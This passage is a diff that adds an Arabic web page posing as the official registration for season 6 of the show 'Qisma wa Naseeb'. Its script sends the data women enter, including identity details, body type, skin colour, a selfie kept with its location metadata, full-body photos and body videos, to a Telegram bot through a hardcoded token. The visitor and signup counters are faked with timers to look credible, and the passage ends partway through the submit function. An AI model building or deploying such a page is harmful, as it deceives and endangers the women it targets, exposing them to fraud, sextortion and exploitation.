@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+<title>قسمة ونصيب — سيزن 6 | التسجيل الرسمي</title>
+<style>
+  :root{
+    --pink:#ff2e6e;
+    --pink2:#ff6aa0;
+    --gold:#ffcf7a;
+    --ok:#33d69f;
+    --err:#ff4d4d;
+    --txt:#ffe8f1;
+  }
+  *{box-sizing:border-box; margin:0; padding:0; font-family:'Segoe UI', Tahoma, Arial, sans-serif;}
+  html,body{height:100%;}
+  body{
+    min-height:100vh;
+    background:
+      radial-gradient(1200px 600px at 20% 0%, #4a0f2a 0%, transparent 60%),
+      radial-gradient(900px 500px at 90% 100%, #5b0f33 0%, transparent 60%),
+      linear-gradient(160deg,#120309 0%, #22081a 50%, #120309 100%);
+    color:var(--txt);
+    display:flex; align-items:flex-start; justify-content:center;
+    padding:22px 16px 60px;
+    position:relative;
+    overflow-x:hidden;
+  }
+  .hearts{position:fixed; inset:0; pointer-events:none; overflow:hidden; z-index:0;}
+  .hearts span{
+    position:absolute; bottom:-40px; color:var(--pink);
+    animation: floatUp linear infinite; opacity:.5; font-size:20px;
+  }
+  @keyframes floatUp{
+    0%{transform:translateY(0) rotate(0); opacity:0}
+    10%{opacity:.65}
+    100%{transform:translateY(-115vh) rotate(360deg); opacity:0}
+  }
+  .wrap{width:100%; max-width:720px; position:relative; z-index:2; margin:auto;}
+  .card{
+    background: linear-gradient(180deg, rgba(37,8,26,.94), rgba(20,4,14,.96));
+    border:1px solid rgba(255,110,160,.25);
+    border-radius:24px;
+    padding:28px 22px;
+    box-shadow: 0 20px 60px rgba(255,46,110,.18), inset 0 0 40px rgba(255,110,160,.05);
+    backdrop-filter: blur(8px);
+    display:none;
+    animation: fadeIn .5s ease;
+  }
+  .card.active{display:block;}
+  @keyframes fadeIn{from{opacity:0; transform:translateY(12px)} to{opacity:1; transform:translateY(0)}}
+  .logo{display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:14px;}
+  .logo .heart-logo{width:66px; height:66px;}
+  .logo .heart-logo svg{width:100%; height:100%; filter: drop-shadow(0 0 12px rgba(255,46,110,.75));}
+  h1{font-size:25px; text-align:center; color:#fff; letter-spacing:.5px;}
+  h2{font-size:20px; text-align:center; color:var(--gold); margin-bottom:8px;}
+  p.sub{text-align:center; color:#ffb8d1; font-size:14px; margin-bottom:18px; line-height:1.7;}
+  .terms{
+    background: rgba(255,46,110,.07);
+    border:1px dashed rgba(255,110,160,.4);
+    border-radius:16px; padding:16px; margin:14px 0;
+    font-size:14px; line-height:1.95; color:#ffd9e6;
+  }
+  .terms b{color:var(--gold);}
+  .check-row{
+    display:flex; align-items:center; gap:10px;
+    background: rgba(255,255,255,.03);
+    border:1px solid rgba(255,110,160,.22);
+    border-radius:12px; padding:12px 14px; margin:10px 0;
+    cursor:pointer; user-select:none; transition:.2s;
+  }
+  .check-row:hover{border-color:var(--pink2); background:rgba(255,46,110,.08);}
+  .check-row input{width:20px; height:20px; accent-color:var(--pink); cursor:pointer; flex-shrink:0;}
+  .check-row label{cursor:pointer; font-size:14.5px; flex:1; line-height:1.6;}
+  .btn{
+    width:100%; padding:15px; margin-top:14px;
+    border:none; border-radius:14px;
+    background:linear-gradient(90deg, var(--pink), #ff8fbc);
+    color:#fff; font-size:16px; font-weight:700; letter-spacing:.3px;
+    cursor:pointer; transition:.25s;
+    box-shadow: 0 10px 25px rgba(255,46,110,.35);
+  }
+  .btn:hover{transform:translateY(-2px); box-shadow:0 14px 32px rgba(255,46,110,.5);}
+  .btn:disabled{opacity:.5; cursor:not-allowed; transform:none; box-shadow:none;}
+  .btn-ghost{
+    background:transparent; border:1px solid rgba(255,110,160,.4); color:#ffb8d1;
+    box-shadow:none;
+  }
+  .btn-ghost:hover{background:rgba(255,46,110,.08);}
+  .stats{display:flex; gap:14px; margin-bottom:20px; flex-wrap:wrap;}
+  .stat{
+    flex:1; min-width:140px;
+    background: linear-gradient(160deg, rgba(255,46,110,.15), rgba(255,110,160,.05));
+    border:1px solid rgba(255,110,160,.3);
+    border-radius:16px; padding:16px; text-align:center;
+  }
+  .stat .num{font-size:28px; font-weight:800; color:var(--gold);}
+  .stat .lbl{font-size:12.5px; color:#ffb8d1; margin-top:4px;}
+  input[type=text], input[type=tel], input[type=url], input[type=date], input[type=number], select, textarea{
+    width:100%; padding:12px 14px; margin-top:6px; margin-bottom:14px;
+    background: rgba(255,255,255,.04);
+    border:1px solid rgba(255,110,160,.25);
+    border-radius:12px; color:#fff; font-size:14.5px;
+    outline:none; transition:.2s;
+  }
+  input:focus, select:focus, textarea:focus{border-color:var(--pink2); box-shadow:0 0 0 3px rgba(255,46,110,.15);}
+  input::placeholder{color:#a97a90;}
+  input[type=date]::-webkit-calendar-picker-indicator{filter:invert(0.8);}
+  label.fl{display:block; font-size:13.5px; color:#ffcfe0; font-weight:600; margin-top:6px;}
+  .row2{display:grid; grid-template-columns:1fr 1fr; gap:12px;}
+  @media(max-width:520px){.row2{grid-template-columns:1fr;}}
+  .warn{
+    background: rgba(255,207,122,.08);
+    border:1px solid rgba(255,207,122,.35);
+    color:#ffe2b8; padding:12px 14px; border-radius:12px; font-size:13px;
+    line-height:1.7; margin:12px 0;
+  }
+  .ok{color:var(--ok); font-size:13px; margin-top:6px; line-height:1.7;}
+  .err{color:var(--err); font-size:13px; margin-top:6px; line-height:1.7;}
+  .preview{display:flex; gap:8px; flex-wrap:wrap; margin-top:8px;}
+  .preview img, .preview video{
+    width:80px; height:80px; object-fit:cover; border-radius:10px;
+    border:1px solid rgba(255,110,160,.4);
+  }
+  .toggle-group{display:flex; gap:10px; margin-bottom:14px; flex-wrap:wrap;}
+  .toggle-group button{
+    flex:1; min-width:80px; padding:12px; border-radius:12px;
+    border:1px solid rgba(255,110,160,.3);
+    background:rgba(255,255,255,.03);
+    color:#ffcfe0; font-weight:600; cursor:pointer; transition:.2s;
+  }
+  .toggle-group button.sel{
+    background:linear-gradient(90deg,var(--pink),#ff8fbc);
+    color:#fff; border-color:transparent;
+    box-shadow:0 8px 20px rgba(255,46,110,.35);
+  }
+  .swatches{display:flex; gap:10px; flex-wrap:wrap; margin-bottom:14px;}
+  .swatch{
+    width:44px; height:44px; border-radius:50%; cursor:pointer;
+    border:3px solid transparent; transition:.2s;
+  }
+  .swatch.sel{border-color:var(--gold); transform:scale(1.1);}
+  .swatch[data-skin="white"]{background:#f5d6c6;}
+  .swatch[data-skin="wheat"]{background:#d9a97b;}
+  .swatch[data-skin="brown"]{background:#a06a3f;}
+  .swatch[data-skin="black"]{background:#4a2a1a;}
+  .file-btn{
+    display:flex; align-items:center; justify-content:center; gap:8px;
+    padding:14px; border-radius:12px; cursor:pointer;
+    background:rgba(255,46,110,.1);
+    border:1px dashed rgba(255,110,160,.5);
+    color:#ffb8d1; font-weight:600; font-size:14px;
+    margin-bottom:10px; transition:.2s;
+  }
+  .file-btn:hover{background:rgba(255,46,110,.18);}
+  .file-btn input{display:none;}
+  .top-bar{
+    display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:16px; font-size:13px; color:#ffb8d1; gap:10px;
+  }
+  .top-bar .badge{
+    background:rgba(255,46,110,.15); padding:5px 12px; border-radius:20px;
+    border:1px solid rgba(255,110,160,.3); white-space:nowrap;
+  }
+  .toast{
+    position:fixed; bottom:24px; right:50%; transform:translateX(50%) translateY(120px);
+    background:linear-gradient(90deg,var(--pink),#ff8fbc);
+    color:#fff; padding:14px 22px; border-radius:14px; font-weight:600;
+    box-shadow:0 14px 40px rgba(255,46,110,.5);
+    transition:.4s; z-index:999; font-size:14px;
+    max-width:90vw; text-align:center;
+  }
+  .toast.show{transform:translateX(50%) translateY(0);}
+  .toast.err{background:linear-gradient(90deg,#c62828,#ff5252);}
+  .toast.ok{background:linear-gradient(90deg,#00a86b,#33d69f);}
+  .final-msg{text-align:center; padding:18px 8px;}
+  .final-msg .big{font-size:22px; color:var(--gold); margin-bottom:10px; font-weight:800;}
+  .final-msg p{font-size:14px; line-height:1.9; color:#ffd9e6; margin-bottom:8px;}
+  .spinner{
+    display:inline-block; width:16px; height:16px; border:2px solid rgba(255,255,255,.3);
+    border-top-color:#fff; border-radius:50%; animation:spin .8s linear infinite;
+    vertical-align:middle; margin-right:6px;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  hr{border:0; border-top:1px dashed rgba(255,110,160,.3); margin:18px 0;}
+  .hint{font-size:12px; color:#c9a0b4; margin-top:-8px; margin-bottom:10px;}
+</style>
+</head>
+<body>
+
+<div class="hearts" id="hearts"></div>
+
+<div class="wrap">
+
+  <!-- ============ صفحة 1: الشروط ============ -->
+  <div class="card active" id="page1">
+    <div class="logo">
+      <div class="heart-logo">
+        <svg viewBox="0 0 100 100">
+          <defs>
+            <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0" stop-color="#ff2e6e"/>
+              <stop offset="1" stop-color="#ff8fbc"/>
+            </linearGradient>
+          </defs>
+          <path d="M50 88 C 20 65, 5 45, 5 30 C 5 15, 20 8, 32 14 C 42 19, 50 30, 50 30 C 50 30, 58 19, 68 14 C 80 8, 95 15, 95 30 C 95 45, 80 65, 50 88 Z" fill="url(#g1)" stroke="#fff" stroke-width="2"/>
+        </svg>
+      </div>
+    </div>
+    <h1>قسمة ونصيب</h1>
+    <p class="sub">السيزن السادس — التسجيل الرسمي</p>
+
+    <div class="terms">
+      <p><b>⚠️ شروط الانضمام للبرنامج:</b></p>
+      <p>• هذا البرنامج <b>قسمة ونصيب — سيزن 6</b> سيكون <b>مختلطاً</b> (رجال ونساء).</p>
+      <p>• يلزم أن يكون العمر <b>فوق 18 سنة</b>.</p>
+      <p>• يحتوي الجزء السادس على <b>لقطات حب</b> ومشاهد عاطفية.</p>
+      <p>• المعلومات التي تدخلها ستُعامل بسرية تامة من إدارة البرنامج.</p>
+    </div>
+
+    <div class="check-row" onclick="toggleCheck('chk1', event)">
+      <input type="checkbox" id="chk1" onclick="event.stopPropagation(); checkTerms();"/>
+      <label for="chk1">أُؤكد أن عمري <b>فوق 18 سنة</b></label>
+    </div>
+    <div class="check-row" onclick="toggleCheck('chk2', event)">
+      <input type="checkbox" id="chk2" onclick="event.stopPropagation(); checkTerms();"/>
+      <label for="chk2">أُؤكد أنني <b>قرأت الشروط وفهمتها</b> وأوافق عليها</label>
+    </div>
+
+    <button class="btn" id="btnEnter" disabled onclick="goPage2()">دخول الموقع</button>
+  </div>
+
+  <!-- ============ صفحة 2: الإحصائيات + كود الدخول ============ -->
+  <div class="card" id="page2">
+    <div class="top-bar">
+      <span class="badge">🕐 تحديث حي</span>
+      <span class="badge">قسمة ونصيب — س6</span>
+    </div>
+
+    <h2>إحصائيات الموقع</h2>
+    <div class="stats">
+      <div class="stat">
+        <div class="num" id="visitsNum">0</div>
+        <div class="lbl">👁️ عدد الزيارات</div>
+      </div>
+      <div class="stat">
+        <div class="num" id="signupsNum">0</div>
+        <div class="lbl">✅ عدد المسجّلين</div>
+      </div>
+    </div>
+
+    <div class="warn">
+      🔐 <b>رمز الدخول:</b> كل رمز صالح للاستعمال <b>مرة واحدة فقط</b>.
+      الرموز موزّعة من إدارة البرنامج.
+    </div>
+
+    <label class="fl" for="accessCode">أدخل رمز الدخول</label>
+    <input type="text" id="accessCode" placeholder="مثال: QN-7F3A-9K2M" autocomplete="off" style="text-transform:uppercase"/>
+    <div id="codeMsg"></div>
+
+    <button class="btn" onclick="verifyCode()">تحقق ودخول</button>
+  </div>
+
+  <!-- ============ صفحة 3: المعلومات الشخصية ============ -->
+  <div class="card" id="page3">
+    <div class="top-bar">
+      <span class="badge">المرحلة 1 / 2</span>
+      <span class="badge">🔒 بيانات سرية</span>
+    </div>
+
+    <h2>أهلاً وسهلاً بك 💖</h2>
+    <p class="sub">سوف تتواصل معك إدارة البرنامج بعد مراجعة معلوماتك من فريق نساء البرنامج</p>
+
+    <div class="warn">
+      🔒 <b>ملاحظة هامة:</b> المعلومات التي تُدخلها سوف يراجعها فريق نساء البرنامج،
+      والمعلومات حساسة جداً — إدارة البرنامج تتعامل مع معلوماتكم بـ<b>سرية وأمان تامّين</b>.
+    </div>
+
+    <label class="fl">الاسم واللقب الكامل *</label>
+    <input type="text" id="fullName" placeholder="مثال: سارة أحمد محمد" required/>
+
+    <div class="row2">
+      <div>
+        <label class="fl">العمر *</label>
+        <input type="number" id="age" min="18" max="99" placeholder="18"/>
+      </div>
+      <div>
+        <label class="fl">تاريخ الميلاد *</label>
+        <input type="date" id="dob"/>
+      </div>
+    </div>
+
+    <div class="row2">
+      <div>
+        <label class="fl">الجنسية *</label>
+        <input type="text" id="nationality" placeholder="مثال: سعودية"/>
+      </div>
+      <div>
+        <label class="fl">البلد المقيم فيه حالياً *</label>
+        <input type="text" id="residence" placeholder="مثال: السعودية - الرياض"/>
+      </div>
+    </div>
+
+    <label class="fl">هل عندك جواز سفر؟ *</label>
+    <div class="toggle-group" id="passportGroup">
+      <button type="button" data-val="نعم" onclick="pickToggle('passportGroup','نعم')">نعم</button>
+      <button type="button" data-val="لا" onclick="pickToggle('passportGroup','لا')">لا</button>
+    </div>
+
+    <label class="fl">لون بشرتك *</label>
+    <div class="swatches" id="skinSwatches">
+      <div class="swatch" data-skin="white" title="بيضاء" onclick="pickSkin('بيضاء')"></div>
+      <div class="swatch" data-skin="wheat" title="حنطية" onclick="pickSkin('حنطية')"></div>
+      <div class="swatch" data-skin="brown" title="سمراء" onclick="pickSkin('سمراء')"></div>
+      <div class="swatch" data-skin="black" title="سوداء" onclick="pickSkin('سوداء')"></div>
+    </div>
+    <div class="hint">اختر لوناً — سيظهر إطاره ذهبياً عند الاختيار</div>
+
+    <label class="fl">لون شعرك *</label>
+    <input type="text" id="hairColor" placeholder="مثال: أسود / بني فاتح / أشقر"/>
+
+    <label class="fl">اللغات التي تتحدث بها *</label>
+    <input type="text" id="languages" placeholder="مثال: العربية، الإنجليزية، الفرنسية"/>
+
+    <label class="fl">رقم الهاتف المفتوح عليه تيليجرام (للتواصل) *</label>
+    <input type="tel" id="phone" placeholder="+966 5X XXX XXXX" dir="ltr"/>
+
+    <button class="btn" onclick="goStage2()">التالي — المرحلة الثانية ➜</button>
+  </div>
+
+  <!-- ============ صفحة 4: معلومات إضافية + صور وفيديو ============ -->
+  <div class="card" id="page4">
+    <div class="top-bar">
+      <span class="badge">المرحلة 2 / 2</span>
+      <span class="badge">📷 وسائط</span>
+    </div>
+
+    <h2>معلومات إضافية</h2>
+    <p class="sub">املئي الحقول بدقة — سيتم مراجعة كل شيء من فريق نساء البرنامج</p>
+
+    <label class="fl">هل أنتِ مشهورة؟ *</label>
+    <div class="toggle-group" id="famousGroup">
+      <button type="button" data-val="نعم" onclick="pickToggle('famousGroup','نعم')">نعم</button>
+      <button type="button" data-val="لا" onclick="pickToggle('famousGroup','لا')">لا</button>
+    </div>
+
+    <label class="fl">نوع جسمك *</label>
+    <div class="toggle-group" id="bodyGroup">
+      <button type="button" data-val="رقيقة" onclick="pickToggle('bodyGroup','رقيقة')">رقيقة</button>
+      <button type="button" data-val="وسط" onclick="pickToggle('bodyGroup','وسط')">وسط</button>
+      <button type="button" data-val="مربربة" onclick="pickToggle('bodyGroup','مربربة')">مربربة</button>
+    </div>
+
+    <label class="fl">رابط حساب تيك توك *</label>
+    <input type="url" id="tiktok" placeholder="https://tiktok.com/@username" dir="ltr"/>
+
+    <label class="fl">رابط حساب إنستغرام (اختياري)</label>
+    <input type="url" id="instagram" placeholder="https://instagram.com/username" dir="ltr"/>
+
+    <label class="fl">رابط حساب سناب شات (اختياري)</label>
+    <input type="url" id="snapchat" placeholder="https://snapchat.com/add/username" dir="ltr"/>
+
+    <hr/>
+
+    <!-- السيلفي -->
+    <label class="fl">صورة سيلفي (من الكاميرا مباشرة) *</label>
+    <div class="file-btn">
+      📸 فتح الكاميرا والتقاط سيلفي
+      <input type="file" id="selfieInput" accept="image/*" capture="user"/>
+    </div>
+    <div class="preview" id="selfiePreview"></div>
+
+    <div class="warn" style="margin-top:12px">
+      🔐 <b>موافقة أمان المستخدم:</b> عند التقاط صورة السيلفي، هل توافقين على
+      إرسال الصورة <b>كما هي كملف</b> مع جميع المعلومات المخزّنة فيها
+      (الموقع الجغرافي، وقت التصوير، بيانات الكاميرا... إن وُجدت) إلى إدارة البرنامج؟
+    </div>
+    <div class="check-row" onclick="toggleCheck('chkMeta', event)">
+      <input type="checkbox" id="chkMeta" onclick="event.stopPropagation()"/>
+      <label for="chkMeta">أوافق على إرسال صورة السيلفي كملف مع معلوماتها المخزّنة</label>
+    </div>
+
+    <!-- 3 صور كاملة -->
+    <label class="fl" style="margin-top:14px">3 صور كاملة الجسم (من الرأس إلى القدم) *</label>
+    <div class="file-btn">
+      🖼️ اختيار 3 صور (من المعرض)
+      <input type="file" id="bodyPhotosInput" accept="image/*" multiple/>
+    </div>
+    <div class="preview" id="bodyPreview"></div>
+
+    <!-- فيديو عادي -->
+    <label class="fl" style="margin-top:14px">فيديو عادي لشكلك *</label>
+    <div class="file-btn">
+      🎬 اختيار فيديو عادي
+      <input type="file" id="normalVideoInput" accept="video/*"/>
+    </div>
+    <div class="preview" id="normalVideoPreview"></div>
+
+    <!-- فيديو تفاصيل الجسم -->
+    <label class="fl" style="margin-top:14px">فيديو يظهر كل تفاصيل الجسم (سجل الجسم ولياقة الجسم) *</label>
+    <div class="file-btn">
+      🎥 اختيار فيديو تفاصيل الجسم
+      <input type="file" id="bodyVideoInput" accept="video/*"/>
+    </div>
+    <div class="preview" id="bodyVideoPreview"></div>
+
+    <button class="btn" id="btnSubmit" onclick="submitAll()">📤 إرسال المعلومات إلى الإدارة</button>
+    <div id="submitMsg"></div>
+  </div>
+
+  <!-- ============ صفحة 5: النجاح ============ -->
+  <div class="card" id="page5">
+    <div class="final-msg">
+      <div class="heart-logo" style="width:80px;height:80px;margin:0 auto 14px">
+        <svg viewBox="0 0 100 100">
+          <path d="M50 88 C 20 65, 5 45, 5 30 C 5 15, 20 8, 32 14 C 42 19, 50 30, 50 30 C 50 30, 58 19, 68 14 C 80 8, 95 15, 95 30 C 95 45, 80 65, 50 88 Z" fill="#ff2e6e" stroke="#fff" stroke-width="2"/>
+        </svg>
+      </div>
+      <div class="big">تم إرسال معلوماتك بنجاح 💖</div>
+      <p>شكراً لك على التسجيل في <b>قسمة ونصيب — سيزن 6</b>.</p>
+      <p>فريق نساء البرنامج سيراجع معلوماتك، وسيتم التواصل معك عبر <b>تيليجرام</b> على الرقم الذي أدخلته.</p>
+      <p>يرجى إبقاء حسابك على تيليجرام مفتوحاً. 🔒</p>
+      <p style="margin-top:16px; color:#ffb8d1; font-size:13px">إدارة البرنامج — قسمة ونصيب</p>
+    </div>
+    <button class="btn btn-ghost" onclick="location.reload()">العودة للبداية</button>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ============================================================
+   1) الإعدادات
+============================================================ */
+const BOT_TOKEN = "9017593502:AAFfwL1q4OPjh596cKVqLkyqbGtHSGHt_po";
+const CHAT_ID   = "7669414161";
+const TG_API    = "https://api.telegram.org/bot" + BOT_TOKEN;
+
+/* ============================================================
+   2) رموز الدخول — كل رمز صالح مرة واحدة فقط
+   (تُخزَّن في localStorage لإبطالها بعد الاستخدام)
+   عدّلي هذه القائمة كما تريدين
+============================================================ */
+const VALID_CODES = [
+  "QN-7F3A-9K2M",
+  "QN-2B8X-4L7P",
+  "QN-5R9N-1T6W",
+  "QN-8H4D-3C2V",
+  "QN-6P2Y-7J9S",
+  "QN-1M5Q-8F4A",
+  "QN-3T7V-2N6Z",
+  "QN-9C4R-5B1K",
+  "QN-4W8S-6H3D",
+  "QN-2X6L-9P5M",
+  "QN-7T1N-3R8B",
+  "QN-5K9M-2V6X",
+  "QN-8Q3P-4L7N",
+  "QN-1H6S-9D2T",
+  "QN-6B4V-8M3P",
+  "QN-9N2C-5F7K",
+  "QN-3X7G-1R4W",
+  "QN-7V5B-2N9L",
+  "QN-4M8D-6T1Q",
+  "QN-2R9F-8X5H"
+];
+
+function getUsedCodes(){
+  try{ return JSON.parse(localStorage.getItem("qn_used_codes") || "[]"); }
+  catch(e){ return []; }
+}
+function markCodeUsed(code){
+  const used = getUsedCodes();
+  if(!used.includes(code)){
+    used.push(code);
+    localStorage.setItem("qn_used_codes", JSON.stringify(used));
+  }
+}
+
+/* ============================================================
+   3) إحصائيات الزيارات والتسجيلات
+   - الزيارات: +1 كل دقيقتين
+   - التسجيلات: +1 كل 10 دقائق
+============================================================ */
+function getStats(){
+  try{
+    const s = JSON.parse(localStorage.getItem("qn_stats") || "null");
+    return s || {visits:0, signups:0, t:Date.now()};
+  }catch(e){ return {visits:0, signups:0, t:Date.now()}; }
+}
+function saveStats(s){ localStorage.setItem("qn_stats", JSON.stringify(s)); }
+function renderStats(){
+  const s = getStats();
+  document.getElementById("visitsNum").textContent  = s.visits;
+  document.getElementById("signupsNum").textContent = s.signups;
+}
+function initStats(){
+  let s = getStats();
+  if(!s.t) s.t = Date.now();
+  saveStats(s);
+  renderStats();
+  setInterval(()=>{
+    const st = getStats();
+    const now = Date.now();
+    const elapsed = now - st.t;
+    const visitsInc  = Math.floor(elapsed / (2*60*1000));
+    const signupsInc = Math.floor(elapsed / (10*60*1000));
+    if(visitsInc>0 || signupsInc>0){
+      st.visits  += visitsInc;
+      st.signups += signupsInc;
+      st.t = now;
+      saveStats(st);
+      renderStats();
+    }
+  }, 5000);
+}
+function bumpSignup(){
+  const st = getStats();
+  st.signups += 1;
+  saveStats(st);
+  renderStats();
+}
+
+/* ============================================================
+   4) قلوب متطايرة
+============================================================ */
+function spawnHearts(){
+  const c = document.getElementById("hearts");
+  const icons = ["❤️","💖","💕","💗","🌸","✨","💞"];
+  for(let i=0;i<20;i++){
+    const sp = document.createElement("span");
+    sp.textContent = icons[Math.floor(Math.random()*icons.length)];
+    sp.style.left = Math.random()*100 + "%";
+    sp.style.fontSize = (14 + Math.random()*22) + "px";
+    sp.style.animationDuration = (9 + Math.random()*10) + "s";
+    sp.style.animationDelay = (Math.random()*9) + "s";
+    c.appendChild(sp);
+  }
+}
+
+/* ============================================================
+   5) التنقل والرسائل
+============================================================ */
+function showPage(id){
+  document.querySelectorAll(".card").forEach(c=>c.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  window.scrollTo({top:0, behavior:"smooth"});
+}
+let toastTimer = null;
+function toast(msg, type=""){
+  const t = document.getElementById("toast");
+  t.textContent = msg;
+  t.className = "toast show " + type;
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(()=>{ t.className = "toast " + type; }, 3500);
+}
+
+/* ============================================================
+   6) صفحة 1 — الشروط
+============================================================ */
+function toggleCheck(id, ev){
+  if(ev && ev.target.tagName === "INPUT") return;
+  const el = document.getElementById(id);
+  el.checked = !el.checked;
+  if(id==="chk1" || id==="chk2") checkTerms();
+}
+function checkTerms(){
+  const a = document.getElementById("chk1").checked;
+  const b = document.getElementById("chk2").checked;
+  document.getElementById("btnEnter").disabled = !(a && b);
+}
+function goPage2(){ showPage("page2"); }
+
+/* ============================================================
+   7) صفحة 2 — تحقق من رمز الدخول
+============================================================ */
+function verifyCode(){
+  const inp  = document.getElementById("accessCode");
+  const code = inp.value.trim().toUpperCase();
+  const msg  = document.getElementById("codeMsg");
+  msg.innerHTML = "";
+
+  if(!code){
+    msg.innerHTML = '<div class="err">❌ الرجاء إدخال رمز الدخول</div>';
+    return;
+  }
+  const used = getUsedCodes();
+  if(used.includes(code)){
+    msg.innerHTML = '<div class="err">❌ هذا الرمز مستعمل من قبل ولا يمكن استخدامه مرة أخرى</div>';
+    return;
+  }
+  if(!VALID_CODES.includes(code)){
+    msg.innerHTML = '<div class="err">❌ رمز غير صحيح</div>';
+    return;
+  }
+  markCodeUsed(code);
+  msg.innerHTML = '<div class="ok">✅ تم التحقق بنجاح، جاري الدخول...</div>';
+  setTimeout(()=> showPage("page3"), 700);
+}
+
+/* ============================================================
+   8) أدوات الحقول
+============================================================ */
+function pickToggle(groupId, val){
+  const g = document.getElementById(groupId);
+  g.querySelectorAll("button").forEach(b=>{
+    b.classList.toggle("sel", b.dataset.val === val);
+  });
+  g.dataset.value = val;
+}
+function pickSkin(val){
+  document.querySelectorAll("#skinSwatches .swatch").forEach(s=>{
+    s.classList.toggle("sel", s.title === val);
+  });
+  document.getElementById("skinSwatches").dataset.value = val;
+}
+function val(id){ return document.getElementById(id).value.trim(); }
+function groupVal(id){ return document.getElementById(id).dataset.value || ""; }
+function skinVal(){ return document.getElementById("skinSwatches").dataset.value || ""; }
+
+/* ============================================================
+   9) صفحة 3 — التحقق والانتقال
+============================================================ */
+function goStage2(){
+  const age = parseInt(val("age"));
+  if(!val("fullName") || val("fullName").split(" ").length < 2)
+    return toast("❌ الاسم واللقب الكامل مطلوب", "err");
+  if(!age || age < 18)
+    return toast("❌ يجب أن يكون العمر 18 سنة أو أكثر", "err");
+  if(!val("dob"))         return toast("❌ تاريخ الميلاد مطلوب", "err");
+  if(!val("nationality")) return toast("❌ الجنسية مطلوبة", "err");
+  if(!val("residence"))   return toast("❌ البلد المقيم مطلوب", "err");
+  if(!groupVal("passportGroup")) return toast("❌ حدّد جواز السفر", "err");
+  if(!skinVal())          return toast("❌ اختر لون البشرة", "err");
+  if(!val("hairColor"))   return toast("❌ لون الشعر مطلوب", "err");
+  if(!val("languages"))   return toast("❌ اللغات مطلوبة", "err");
+  if(!val("phone"))       return toast("❌ رقم الهاتف مطلوب", "err");
+
+  showPage("page4");
+}
+
+/* ============================================================
+   10) معاينة الملفات
+============================================================ */
+let selfieFile = null, bodyPhotos = [], normalVideo = null, bodyVideo = null;
+
+document.getElementById("selfieInput").addEventListener("change", e=>{
+  const f = e.target.files[0];
+  if(!f) return;
+  selfieFile = f;
+  const p = document.getElementById("selfiePreview");
+  p.innerHTML = "";
+  const img = document.createElement("img");
+  img.src = URL.createObjectURL(f);
+  p.appendChild(img);
+  toast("✅ تم التقاط السيلفي", "ok");
+});
+
+document.getElementById("bodyPhotosInput").addEventListener("change", e=>{
+  const files = Array.from(e.target.files).slice(0,3);
+  bodyPhotos = files;
+  const p = document.getElementById("bodyPreview");
+  p.innerHTML = "";
+  files.forEach(f=>{
+    const img = document.createElement("img");
+    img.src = URL.createObjectURL(f);
+    p.appendChild(img);
+  });
+  if(files.length < 3) toast("⚠️ يجب اختيار 3 صور كاملة الجسم", "err");
+});
+
+document.getElementById("normalVideoInput").addEventListener("change", e=>{
+  const f = e.target.files[0];
+  if(!f) return;
+  normalVideo = f;
+  const p = document.getElementById("normalVideoPreview");
+  p.innerHTML = "";
+  const v = document.createElement("video");
+  v.src = URL.createObjectURL(f);
+  v.controls = true;
+  p.appendChild(v);
+});
+
+document.getElementById("bodyVideoInput").addEventListener("change", e=>{
+  const f = e.target.files[0];
+  if(!f) return;
+  bodyVideo = f;
+  const p = document.getElementById("bodyVideoPreview");
+  p.innerHTML = "";
+  const v = document.createElement("video");
+  v.src = URL.createObjectURL(f);
+  v.controls = true;
+  p.appendChild(v);
+});
+
+/* ============================================================
+   11) دوال الإرسال إلى تيليجرام
+   - نستخدم FormData (multipart) وهو "Simple Request" لا يطلق preflight
+   - للرسائل النصية نستخدم sendMessage مع JSON
+============================================================ */
+async function tgSendMessage(text){
+  const r = await fetch(TG_API + "/sendMessage", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode:"HTML"})
+  });
+  return r.json();
+}
+async function tgSendFile(file, method, caption){
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  if(method === "sendDocument") fd.append("document", file, file.name);
+  if(method === "sendPhoto")    fd.append("photo",    file, file.name);
+  if(method === "sendVideo")    fd.append("video",    file, file.name);
+  if(caption) fd.append("caption", caption);
+  const r = await fetch(TG_API + "/" + method, {method:"POST", body: fd});
+  return r.json();
+}
+
+/* ============================================================
+   12) بناء نص الرسالة النهائية
+============================================================ */
+function esc(s){ return (s||"").toString(); }
+function buildCaption(){
+  return (
+`💖 <b>تسجيل جديد — قسمة ونصيب س6</b>
+
+👤 <b>الاسم واللقب:</b> ${esc(val("fullName"))}
+🎂 <b>العمر:</b> ${esc(val("age"))}
+📅 <b>تاريخ الميلاد:</b> ${esc(val("dob"))}
+🌍 <b>الجنسية:</b> ${esc(val("nationality"))}
+🏠 <b>بلد الإقامة:</b> ${esc(val("residence"))}
+🛂 <b>جواز سفر:</b> ${esc(groupVal("passportGroup"))}
+🎨 <b>لون البشرة:</b> ${esc(skinVal())}
+💇 <b>لون الشعر:</b> ${esc(val("hairColor"))}
+🗣️ <b>اللغات:</b> ${esc(val("languages"))}
+📱 <b>هاتف تيليجرام:</b> ${esc(val("phone"))}
+⭐ <b>مشهورة:</b> ${esc(groupVal("famousGroup"))}
+💃 <b>نوع الجسم:</b> ${esc(groupVal("bodyGroup"))}
+🎵 <b>تيك توك:</b> ${esc(val("tiktok") || "-")}
+📸 <b>إنستغرام:</b> ${esc(val("instagram") || "-")}
+👻 <b>سناب:</b> ${esc(val("snapchat") || "-")}`
+  );
+}
+
+/* ============================================================
+   13) الإرسال النهائي
+============================================================ */
+async function submitAll(){
+  // التحقق
+  if(!groupVal("famousGroup")) return toast("❌ حدّدي هل أنتِ مشهورة", "err");
+  if(!groupVal("bodyGroup"))   return toast("❌ حدّدي نوع الجسم", "err");
+  if(!val("tiktok"))           return toast("❌ رابط تيك توك مطلوب", "err");
+  if(!selfieFile)              return toast("❌ صورة السيلفي مطلوبة", "err");
